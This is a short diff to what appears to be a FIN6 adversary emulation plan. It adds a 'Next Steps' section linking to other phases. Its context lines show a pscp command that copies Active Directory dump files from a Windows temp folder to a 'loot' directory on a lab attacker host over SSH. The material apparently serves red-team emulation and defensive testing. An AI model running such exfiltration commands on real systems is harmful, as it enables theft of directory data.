@@ -243,3 +243,9 @@ Example: C:\>plink -ssh root@192.168.101.1
 ```sh
 pscp -P {port} c:\windows\temp\ad_* root@192.168.101.1:/temp/loot
 ```
+--- 
+
+## Next Steps
+
+- [FIN6 Operations Flow](/fin6/Operations_Flow.md)
+- [FIN6 Phase 2](/fin6/Emulation_Plan/Phase2.md)
